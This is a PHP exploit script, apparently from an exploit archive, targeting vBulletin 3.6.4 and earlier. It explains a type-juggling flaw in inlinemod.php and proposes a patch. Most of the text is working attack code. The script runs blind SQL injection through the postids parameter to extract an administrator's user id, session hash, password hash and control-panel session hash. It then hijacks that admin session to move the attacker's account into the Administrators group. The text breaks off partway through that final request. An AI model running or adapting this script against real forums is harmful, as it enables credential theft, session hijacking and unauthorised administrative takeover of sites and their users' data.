<html><head><title>vBulletin <= 3.6.4 (inlinemod.php postids) Remote SQL Injection Exploit</title></head><pre>&lt;?php
print_r('
-----------------------------------------------------------------------------
vBulletin &lt;= 3.6.4 inlinemod.php &quot;postids&quot; sql injection / privilege
escalation by session hijacking exploit
by rgod
mail: retrog at alice dot it
site: http://retrogod.altervista.org

Works regardless of php.ini settings, you need a Super Moderator account
to copy posts among threads, to be launched while admin is logged in to
the control panel, this will give you full admin privileges
note: this will flood the forum with empty threads even!
-----------------------------------------------------------------------------
');

if ($argc&lt;7) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path user pass forumid postid OPTIONS
host:      target server (ip/hostname)
path:      path to vbulletin
user/pass: you need a moderator account
forumid:   existing forum
postid:    existing post
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /vbulletin/ rgod mypass 2 121 -P1.1.1.1:80
php '.$argv[0].' localhost /vbulletin/ rgod mypass 1 143 -p81
-----------------------------------------------------------------------------
');
die;
}
/*
vulnerable code in inlinemod.php near lines 185-209:

...
	case 'docopyposts':

		$vbulletin-&gt;input-&gt;clean_array_gpc('p', array(
			'postids' =&gt; TYPE_STR,
		));

		$postids = explode(',', $vbulletin-&gt;GPC['postids']);
		foreach ($postids AS $index =&gt; $postid)
		{
			if ($postids[&quot;$index&quot;] != intval($postid))
			{
				unset($postids[&quot;$index&quot;]);
			}
		}

		if (empty($postids))
		{
			eval(standard_error(fetch_error('no_applicable_posts_selected')));
		}

		if (count($postids) &gt; $postlimit)
		{
			eval(standard_error(fetch_error('you_are_limited_to_working_with_x_posts', $postlimit)));
		}
		break;
...
when an element of $postids array is not an integer, it fails to unset() the proper value.

An example:

&lt;?php
$foo[1]=&quot;99999) UNION SELECT foo FROM foo WHERE foo=1 LIMIT 1/*&quot;;
$foo[2]=intval($foo[1]);

echo $foo[1].&quot;\n&quot;;
echo $foo[2].&quot;\n&quot;;
if ($foo[1] != $foo[2])
{
 echo &quot;they are different&quot;;
}
else
{
 echo &quot;they match!&quot;;
}
?&gt;

output:

99999) UNION SELECT foo FROM foo WHERE foo=1 LIMIT 1/*
99999
they match!

this because when php tries to comparise a string with an integer
it tries to convert the string in its integer value, it chooses the first integer chars
of the string itself!
so unset() never run!

the result is sql injection near lines 3792-3800:

...
	$posts = $db-&gt;query_read_slave(&quot;
		SELECT post.postid, post.threadid, post.visible, post.title, post.username, post.dateline, post.parentid, post.userid,
			thread.forumid, thread.title AS thread_title, thread.postuserid, thread.visible AS thread_visible, thread.firstpostid,
			thread.sticky, thread.open, thread.iconid
		FROM &quot; . TABLE_PREFIX . &quot;post AS post
		LEFT JOIN &quot; . TABLE_PREFIX . &quot;thread AS thread USING (threadid)
		WHERE postid IN (&quot; . implode(',', $postids) . &quot;)
		ORDER BY post.dateline
	&quot;);
...

this exploit extract various session hashes from the database
to authenticate as admin and to change the privileges of a registered user
I could not find a way to see results inside html, so this asks true/false
questions to the database, copying posts around threads

possible patch, replace:
foreach ($postids AS $index =&gt; $postid)
		{
		   	if ($postids[&quot;$index&quot;] != intval($postid))
			{
			    unset($postids[&quot;$index&quot;]);
			}
		}

with:

foreach ($postids AS $index =&gt; $postid)
		{
	       $postids[&quot;$index&quot;]=(int)$postids[&quot;$index&quot;];
	    }


and, some line before:

foreach ($threadids AS $index =&gt; $threadid)
		{
			if ($threadids[&quot;$index&quot;] != intval($threadid))
			{
				unset($threadids[&quot;$index&quot;]);
			}
		}

with:

foreach ($threadids AS $index =&gt; $threadid)
		{
	       $threadids[&quot;$index&quot;]=(int)$threadids[&quot;$index&quot;];
	    }


vendor was contacted by email form...
*/

error_reporting(7);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$user=$argv[3];
$pass=md5($argv[4]);
$forumid=(int)$argv[5];
$existing_post=(int)$argv[6];

$port=80;
$proxy=&quot;&quot;;
for ($i=3; $i&lt;$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;)) {$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}
if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$data=&quot;vb_login_username=$user&quot;;
$data.=&quot;&amp;vb_login_password=&quot;;
$data.=&quot;&amp;s=&quot;;
$data.=&quot;&amp;do=login&quot;;
$data.=&quot;&amp;vb_login_md5password=$pass&quot;;
$data.=&quot;&amp;vb_login_md5password_utf=$pass&quot;;
$packet=&quot;POST &quot;.$p.&quot;login.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;login.php\r\n&quot;;
$packet.=&quot;Accept-Language: en\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Pragma: no-cache\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
$cookie=&quot;&quot;;
$temp=explode(&quot;Set-Cookie: &quot;,$html);
for ($i=1; $i&lt;count($temp); $i++)
{
  $temp2=explode(&quot; &quot;,$temp[$i]);
  $cookie.=&quot; &quot;.trim($temp2[0]);
}
//echo &quot;your cookie -&gt; &quot;.$cookie.&quot;\n\n&quot;;
if (!eregi(&quot;sessionhash&quot;,$cookie)){die(&quot;failed to login...&quot;);}$temp=str_replace(&quot; &quot;,&quot;&quot;,$cookie);$temp=str_replace(&quot;sessionhash&quot;,&quot;&quot;,$temp);
$temp=str_replace(&quot;lastvisit&quot;,&quot;&quot;,$temp);$temp=str_replace(&quot;lastactivity&quot;,&quot;&quot;,$temp);$temp=explode(&quot;=&quot;,$temp);$temp=explode(&quot;;&quot;,$temp[1]);
$cookie_prefix=trim($temp[1]);echo &quot;cookie prefix -&gt; &quot;.$cookie_prefix.&quot;\n&quot;;

$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers

$j=1;$uid=&quot;&quot;;
echo &quot;admim user id -&gt; &quot;;
while (!strstr($uid,chr(0)))
{
    for ($i=0; $i&lt;=255; $i++)
    {
        if (in_array($i,$chars))
        {
          $data =&quot;s=&quot;;
          $data.=&quot;&amp;do=docopyposts&quot;;
          $data.=&quot;&amp;destforumid=$forumid&quot;;
          $data.=&quot;&amp;title=suntzu&quot;;
          $data.=&quot;&amp;forumid=$forumid&quot;;
          $data.=&quot;&amp;postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(userid,&quot;.$j.&quot;,1))=&quot;.$i.&quot;),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/user/**/WHERE/**/usergroupid=6/**/LIMIT/**/1/*&quot;;
          $packet =&quot;POST &quot;.$p.&quot;inlinemod.php?f=$forumid HTTP/1.0\r\n&quot;;
          $packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
          $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
          $packet.=&quot;Accept-Language: it\r\n&quot;;
          $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
          $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Cookie: &quot;.$cookie.&quot;; \r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
          $packet.=$data;
          sendpacketii($packet);
          $temp=explode(&quot;showthread.php?t=&quot;,$html);
          $temp2=explode(&quot;\n&quot;,$temp[1]);
          $thread=(int)$temp2[0];

          $packet =&quot;GET &quot;.$p.&quot;showthread.php?t=$thread HTTP/1.0\r\n&quot;;
          $packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
          $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
          $packet.=&quot;Accept-Language: it\r\n&quot;;
          $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Cookie: &quot;.$cookie.&quot;; \r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
          sendpacketii($packet);
          if (eregi(&quot;You have an error in your SQL syntax&quot;,$html)){echo $html; die(&quot;\nunknown query error...&quot;);}
          if (eregi(&quot;join date&quot;,$html)) {$uid.=chr($i);echo chr($i); sleep(1); break;}
        }
        if ($i==255) {
            die(&quot;\nExploit failed...&quot;);
        }
    }
$j++;
}
if (trim($uid)==&quot;&quot;){die(&quot;\nExploit failed...&quot;);}else{echo &quot;\nvulnerable!&quot;;}
$uid=intval($uid);

function my_encode($my_string)
{
  $encoded=&quot;CHAR(&quot;;
  for ($k=0; $k&lt;=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=&quot;)&quot;;}
    else {$encoded.=&quot;,&quot;;}
  }
  return $encoded;
}


$j=1;$my_uid=&quot;&quot;;
echo &quot;\nyour user id -&gt; &quot;;
while (!strstr($my_uid,chr(0)))
{
    for ($i=0; $i&lt;=255; $i++)
    {
        if (in_array($i,$chars))
        {
          $data =&quot;s=&quot;;
          $data.=&quot;&amp;do=docopyposts&quot;;
          $data.=&quot;&amp;destforumid=$forumid&quot;;
          $data.=&quot;&amp;title=suntzu&quot;;
          $data.=&quot;&amp;forumid=$forumid&quot;;
          $data.=&quot;&amp;postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(userid,&quot;.$j.&quot;,1))=&quot;.$i.&quot;),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/user/**/WHERE/**/username=&quot;.my_encode($user).&quot;/**/LIMIT/**/1/*&quot;;
          $packet =&quot;POST &quot;.$p.&quot;inlinemod.php?f=$forumid HTTP/1.0\r\n&quot;;
          $packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
          $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
          $packet.=&quot;Accept-Language: it\r\n&quot;;
          $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
          $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Cookie: &quot;.$cookie.&quot;; \r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
          $packet.=$data;
          sendpacketii($packet);
          if (eregi(&quot;You have an error in your SQL syntax&quot;,$html)){echo $html; die(&quot;\nunknown query error...&quot;);}
          $temp=explode(&quot;showthread.php?t=&quot;,$html);
          $temp2=explode(&quot;\n&quot;,$temp[1]);
          $thread=(int)$temp2[0];

          $packet =&quot;GET &quot;.$p.&quot;showthread.php?t=$thread HTTP/1.0\r\n&quot;;
          $packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
          $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
          $packet.=&quot;Accept-Language: it\r\n&quot;;
          $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Cookie: &quot;.$cookie.&quot;; \r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
          sendpacketii($packet);
          if (eregi(&quot;join date&quot;,$html)) {$my_uid.=chr($i);echo chr($i); sleep(1); break;}
        }
        if ($i==255) {
            die(&quot;\nExploit failed...&quot;);
        }
    }
$j++;
}
$my_uid=intval($my_uid);

$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers
$chars=array_merge($chars,range(97,102));//a-f letters
$j=1;$sess_hash=&quot;&quot;;
echo &quot;\nsession hash -&gt; &quot;;
while (!strstr($sess_hash,chr(0)))
{
    for ($i=0; $i&lt;=255; $i++)
    {
      if (in_array($i,$chars))
        {
          $data =&quot;s=&quot;;
          $data.=&quot;&amp;do=docopyposts&quot;;
          $data.=&quot;&amp;destforumid=$forumid&quot;;
          $data.=&quot;&amp;title=suntzu&quot;;
          $data.=&quot;&amp;forumid=$forumid&quot;;
          $data.=&quot;&amp;postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(sessionhash,&quot;.$j.&quot;,1))=&quot;.$i.&quot;),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/session/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*&quot;;
          $packet =&quot;POST &quot;.$p.&quot;inlinemod.php?f=$forumid HTTP/1.0\r\n&quot;;
          $packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
          $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
          $packet.=&quot;Accept-Language: it\r\n&quot;;
          $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
          $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Cookie: &quot;.$cookie.&quot;; \r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
          $packet.=$data;
          sendpacketii($packet);
          if (eregi(&quot;You have an error in your SQL syntax&quot;,$html)){echo $html; die(&quot;\nunknown query error...&quot;);}
          $temp=explode(&quot;showthread.php?t=&quot;,$html);
          $temp2=explode(&quot;\n&quot;,$temp[1]);
          $thread=(int)$temp2[0];

          $packet =&quot;GET &quot;.$p.&quot;showthread.php?t=$thread HTTP/1.0\r\n&quot;;
          $packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
          $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
          $packet.=&quot;Accept-Language: it\r\n&quot;;
          $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Cookie: &quot;.$cookie.&quot;; \r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
          sendpacketii($packet);
          if (eregi(&quot;join date&quot;,$html)) {$sess_hash.=chr($i);echo chr($i); sleep(1); break;}
        }
        if ($i==255) {
            die(&quot;\nExploit failed...&quot;);
        }
    }
$j++;
}

$j=1;$my_hash=&quot;&quot;;
echo &quot;\nuser password hash -&gt; &quot;;
while (!strstr($my_hash,chr(0)))
{
    for ($i=0; $i&lt;=255; $i++)
    {
      if (in_array($i,$chars))
        {
          $data =&quot;s=&quot;;
          $data.=&quot;&amp;do=docopyposts&quot;;
          $data.=&quot;&amp;destforumid=$forumid&quot;;
          $data.=&quot;&amp;title=suntzu&quot;;
          $data.=&quot;&amp;forumid=$forumid&quot;;
          $data.=&quot;&amp;postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(password,&quot;.$j.&quot;,1))=&quot;.$i.&quot;),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/user/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*&quot;;
          $packet =&quot;POST &quot;.$p.&quot;inlinemod.php?f=$forumid HTTP/1.0\r\n&quot;;
          $packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
          $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
          $packet.=&quot;Accept-Language: en\r\n&quot;;
          $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
          $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Cookie: &quot;.$cookie.&quot;; \r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
          $packet.=$data;
          sendpacketii($packet);
          if (eregi(&quot;You have an error in your SQL syntax&quot;,$html)){echo $html; die(&quot;\nunknown query error...&quot;);}
          $temp=explode(&quot;showthread.php?t=&quot;,$html);
          $temp2=explode(&quot;\n&quot;,$temp[1]);
          $thread=(int)$temp2[0];

		  $packet =&quot;GET &quot;.$p.&quot;showthread.php?t=$thread HTTP/1.0\r\n&quot;;
          $packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
          $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
          $packet.=&quot;Accept-Language: en\r\n&quot;;
          $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Cookie: &quot;.$cookie.&quot;; \r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
          sendpacketii($packet);
          if (eregi(&quot;join date&quot;,$html)) {$my_hash.=chr($i);echo chr($i); sleep(1); break;}
        }
        if ($i==255) {
            die(&quot;\nExploit failed...&quot;);
        }
    }
$j++;
}

$j=1;$cpsess_hash=&quot;&quot;;
echo &quot;\ncp session hash -&gt; &quot;;
while (!strstr($cpsess_hash,chr(0)))
{
    for ($i=0; $i&lt;=255; $i++)
    {
      if (in_array($i,$chars))
        {
          $data =&quot;s=&quot;;
          $data.=&quot;&amp;do=docopyposts&quot;;
          $data.=&quot;&amp;destforumid=$forumid&quot;;
          $data.=&quot;&amp;title=suntzu&quot;;
          $data.=&quot;&amp;forumid=$forumid&quot;;
          $data.=&quot;&amp;postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(hash,&quot;.$j.&quot;,1))=&quot;.$i.&quot;),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/cpsession/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*&quot;;
          $packet =&quot;POST &quot;.$p.&quot;inlinemod.php?f=$forumid HTTP/1.0\r\n&quot;;
          $packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
          $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
          $packet.=&quot;Accept-Language: en\r\n&quot;;
          $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
          $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Cookie: &quot;.$cookie.&quot;; \r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
          $packet.=$data;
          sendpacketii($packet);
          $temp=explode(&quot;showthread.php?t=&quot;,$html);
          $temp2=explode(&quot;\n&quot;,$temp[1]);
          $thread=(int)$temp2[0];

          $packet =&quot;GET &quot;.$p.&quot;showthread.php?t=$thread HTTP/1.0\r\n&quot;;
          $packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
          $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
          $packet.=&quot;Accept-Language: en\r\n&quot;;
          $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
          $packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
          $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
          $packet.=&quot;Pragma: no-cache\r\n&quot;;
          $packet.=&quot;Cookie: &quot;.$cookie.&quot;; \r\n&quot;;
          $packet.=&quot;Connection: Close\r\n\r\n&quot;;
          sendpacketii($packet);
          if (eregi(&quot;You have an error in your SQL syntax&quot;,$html)){echo $html; die(&quot;\nunknown query error...&quot;);}
          if (eregi(&quot;join date&quot;,$html)) {$cpsess_hash.=chr($i);echo chr($i); sleep(1); break;}
        }
        if ($i==255) {
            die(&quot;\nExploit failed...&quot;);
        }
    }
$j++;
}
echo &quot;\n&quot;;

$packet =&quot;GET &quot;.$p.&quot;admincp/user.php?do=edit&amp;u=$my_uid HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
$packet.=&quot;Accept-Language: en\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Pragma: no-cache\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie_prefix.&quot;lastactivity=0; &quot;.$cookie_prefix.&quot;password=&quot;.md5(trim($my_hash)).&quot;; bbuserid=&quot;.$uid.&quot;; &quot;.$cookie_prefix.&quot;sessionhash=&quot;.trim($sess_hash).&quot;; &quot;.$cookie_prefix.&quot;cpsession=&quot;.trim($cpsess_hash).&quot;;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
$temp=explode(&quot;adminhash\&quot; value=\&quot;&quot;,$html);
$temp2=explode(&quot;\&quot;&quot;,$temp[1]);
$adminhash=$temp2[0];
echo &quot;adminhash -&gt;&quot;.$adminhash.&quot;\n&quot;;
if ($adminhash&lt;&gt;&quot;&quot;) {echo &quot;\ndone! you are in... updating &quot;.$user.&quot; rights&quot;;}
else {die(&quot;\nexploit failed...&quot;);}

//join to the Administrator group
$my_email=&quot;suntzu@suntzu.com&quot;;
$data =&quot;do=update&quot;;
$data.=&quot;&amp;adminhash=$adminhash&quot;;
$data.=&quot;&amp;quicklinks=user.php%3Fdo%3Deditaccess%26u%3D&quot;.$my_uid;
$data.=&quot;&amp;user%5Busername%5D=$user&quot;;
$data.=&quot;&amp;password=&quot;;
$data.=&quot;&amp;user%5Bemail%5D=$my_email&quot;;
$data.=&quot;&amp;user%5Blanguageid%5D=0&quot;;
$data.=&quot;&amp;user%5Busertitle%5D=Admin&quot;;
$data.=&quot;&amp;user%5Bcustomtitle%5D=0&quot;;
$data.=&quot;&amp;user%5Bhomepage%5D=&quot;;
$data.=&quot;&amp;user%5Bbirthday%5D%5Bmonth%5D=0&quot;;
$data.=&quot;&amp;user%5Bbirthday%5D%5Bday%5D=&quot;;
$data.=&quot;&amp;user%5Bbirthday%5D%5Byear%5D=&quot;;
$data.=&quot;&amp;user%5Bshowbirthday%5D=0&quot;;
$data.=&quot;&amp;user%5Bsignature%5D=&quot;;
$data.=&quot;&amp;user%5Bicq%5D=&quot;;
$data.=&quot;&amp;user%5Baim%5D=&quot;;
$data.=&quot;&amp;user%5Byahoo%5D=&quot;;
$data.=&quot;&amp;user%5Bmsn%5D=&quot;;
$data.=&quot;&amp;user%5Bskype%5D=&quot;;
$data.=&quot;&amp;options%5Bcoppauser%5D=0&quot;;
$data.=&quot;&amp;user%5Bparentemail%5D=$my_email&quot;;
$data.=&quot;&amp;user%5Breferrerid%5D=&quot;;
$data.=&quot;&amp;user%5Bipaddress%5D=&quot;;
$data.=&quot;&amp;user%5Bposts%5D=0&quot;;
$data.=&quot;&amp;userfield%5Bfield1%5D=&quot;;
$data.=&quot;&amp;userfield%5Bfield2%5D=&quot;;
$data.=&quot;&amp;userfield%5Bfield3%5D=&quot;;
$data.=&quot;&amp;userfield%5Bfield4%5D=&quot;;
$data.=&quot;&amp;user%5Busergroupid%5D=6&quot;;//primary usergroup, 6=Administrators
$data.=&quot;&amp;user%5Bdisplaygroupid%5D=-1&quot;;
$data.=&quot;&amp;user%5Bmembergroupids%5D%5B%5D=5&quot;;//secondary usergroup, 5=Super Moderators
$data.=&quot;&amp;options%5Bshowreputation%5D=1&quot;;
$data.=&quot;&amp;user%5Breputation%5D=10&quot;;
$data.=&quot;&amp;user%5Bwarnings%5D=0&quot;;
$data.=&quot;&amp;user%5Binfractions%5D=0&quot;;
$data.=&quot;&amp;user%5Bipoints%5D=0&quot;;
$data.=&quot;&amp;options%5Badminemail%5D=1&quot;;
$data.=&quot;&amp;options%5Bshowemail%5D=0&quot;;
$data.=&quot;&amp;options%5Binvisible%5D=0&quot;;
$data.=&quot;&amp;options%5Bshowvcard%5D=0&quot;;
$data.=&quot;&amp;options%5Breceivepm%5D=1&quot;;
$data.=&quot;&amp;options%5Breceivepmbuddies%5D=0&quot;;
$data.=&quot;&amp;options%5Bemailonpm%5D=0&quot;;
$data.=&quot;&amp;user%5Bpmpopup%5D=0&quot;;
$data.=&quot;&amp;options%5Bshowsignatures%5D=1&quot;;
$data.=&quot;&amp;options%5Bshowavatars%5D=1&quot;;
$data.=&quot;&amp;options%5Bshowimages%5D=1&quot;;
$data.=&quot;&amp;user%5Bautosubscribe%5D=-1&quot;;
$data.=&quot;&amp;user%5Bthreadedmode%5D=0&quot;;
$data.=&quot;&amp;user%5Bshowvbcode%5D=1&quot;;
$data.=&quot;&amp;user%5Bstyleid%5D=0&quot;;
